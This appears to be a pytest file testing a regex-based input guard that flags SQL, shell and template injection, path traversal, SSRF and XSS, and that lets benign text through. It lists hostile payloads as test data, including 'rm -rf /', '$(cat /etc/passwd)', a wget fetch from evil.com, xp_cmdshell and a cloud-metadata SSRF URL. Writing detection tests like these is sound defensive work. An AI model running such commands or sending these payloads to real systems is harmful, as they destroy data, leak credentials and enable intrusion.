from kinnoo.input_guard import (
    InputGuardResult,
    InputWarning,
    PATH_TRAVERSAL,
    SHELL_INJECTION,
    SQL_INJECTION,
    SSRF,
    TEMPLATE_INJECTION,
    XSS,
    RegexInputGuard,
    get_default_guard,
)


def test_result_models_structure() -> None:
    warning = InputWarning(
        threat_category="SQL_INJECTION",
        description="Possible SQL injection pattern",
        param_name="query",
    )
    assert warning.threat_category == "SQL_INJECTION"
    assert warning.description == "Possible SQL injection pattern"
    assert warning.param_name == "query"

    safe_result = InputGuardResult(safe=True, warnings=[])
    assert safe_result.safe is True
    assert safe_result.warnings == []

    unsafe_result = InputGuardResult(safe=False, warnings=[warning])
    assert unsafe_result.safe is False
    assert len(unsafe_result.warnings) == 1
    assert unsafe_result.warnings[0] == warning


def test_get_default_guard_protocol_contract() -> None:
    guard = get_default_guard()

    assert hasattr(guard, "check")
    assert hasattr(guard, "check_inputs")

    single_result = guard.check("safe text")
    assert isinstance(single_result, InputGuardResult)
    assert single_result.safe is True
    assert single_result.warnings == []

    multi_result = guard.check_inputs([
        ("query", "safe text", "text"),
        ("path", "safe/path.txt", "file_path"),
    ])
    assert isinstance(multi_result, InputGuardResult)
    assert multi_result.safe is True
    assert multi_result.warnings == []


def test_sql_injection_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--",
        "' OR 1=1--",
        "'; INSERT INTO users VALUES('admin','pw');--",
        "'; DELETE FROM users;--",
        "'; WAITFOR DELAY '0:0:5';--",
        "'; EXEC xp_cmdshell('whoami');--",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == SQL_INJECTION for w in result.warnings)


def test_shell_injection_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "input | bash",
        "&& wget http://evil.com/payload",
        "file.txt%00.jpg",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == SHELL_INJECTION for w in result.warnings)


def test_path_traversal_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2fetc/passwd",
        "%252e%252e%252fetc/passwd",
        "/etc/passwd",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == PATH_TRAVERSAL for w in result.warnings)


def test_ssrf_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/",
        "dict://localhost:11211/",
        "http://127.0.0.1/admin",
        "http://10.0.0.1/internal",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/secret",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == SSRF for w in result.warnings)


def test_xss_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        '<img onerror="alert(1)" src=x>',
        "data:text/html,<script>alert(1)</script>",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == XSS for w in result.warnings)


def test_template_injection_patterns_detected() -> None:
    guard = RegexInputGuard()
    payloads = [
        "{{ 7*7 }}",
        "<%= system('whoami') %>",
        "${7*7}",
    ]

    for payload in payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == TEMPLATE_INJECTION for w in result.warnings)


def test_safe_inputs_pass_clean() -> None:
    guard = RegexInputGuard()
    safe_inputs = [
        "Hello, how are you?",
        "The price is $19.99",
        "Tell me about SQL databases and SELECT queries",
        "The ratio is 3/4",
        "Check out https://example.com",
    ]

    for value in safe_inputs:
        result = guard.check(value)
        assert result.safe is True
        assert result.warnings == []


def test_type_aware_filtering() -> None:
    guard = RegexInputGuard()

    traversal_in_path = guard.check("../../etc/passwd", "file_path")
    assert traversal_in_path.safe is False
    assert any(w.threat_category == PATH_TRAVERSAL for w in traversal_in_path.warnings)

    sql_in_path = guard.check("' OR 1=1--", "file_path")
    assert sql_in_path.safe is True
    assert sql_in_path.warnings == []

    ssrf_in_url = guard.check("http://169.254.169.254/", "url")
    assert ssrf_in_url.safe is False
    assert any(w.threat_category == SSRF for w in ssrf_in_url.warnings)

    traversal_in_url = guard.check("../../etc/passwd", "url")
    assert traversal_in_url.safe is True
    assert traversal_in_url.warnings == []

    sql_in_id = guard.check("' UNION SELECT *--", "id")
    assert sql_in_id.safe is False
    assert any(w.threat_category == SQL_INJECTION for w in sql_in_id.warnings)

    traversal_in_id = guard.check("../../etc/passwd", "id")
    assert traversal_in_id.safe is True
    assert traversal_in_id.warnings == []


def test_check_inputs_multi_value_aggregation() -> None:
    guard = RegexInputGuard()

    mixed_inputs = [
        ("query", "' OR 1=1--", "text"),
        ("path", "safe/file.txt", "file_path"),
        ("url", "http://169.254.169.254/", "url"),
    ]
    result = guard.check_inputs(mixed_inputs)
    assert result.safe is False

    warning_params = {warning.param_name for warning in result.warnings}
    assert "query" in warning_params
    assert "url" in warning_params
    assert "path" not in warning_params

    safe_result = guard.check_inputs([
        ("query", "normal user prompt", "text"),
        ("path", "docs/readme.md", "file_path"),
        ("url", "https://example.com/public", "url"),
    ])
    assert safe_result.safe is True
    assert safe_result.warnings == []


def test_sql_comment_markers_benign_text_not_flagged() -> None:
    guard = RegexInputGuard()
    benign_inputs = [
        "Roadmap #2026 draft for internal review",
        "Use -- to indicate a pause in writing, not code",
    ]

    for value in benign_inputs:
        result = guard.check(value)
        assert result.safe is True
        assert not any(w.threat_category == SQL_INJECTION for w in result.warnings)


def test_sql_comment_injection_context_still_detected() -> None:
    guard = RegexInputGuard()
    contextual_payloads = [
        "name' -- drop the rest",
        "UNION SELECT password FROM users --",
    ]

    for payload in contextual_payloads:
        result = guard.check(payload)
        assert result.safe is False
        assert any(w.threat_category == SQL_INJECTION for w in result.warnings)
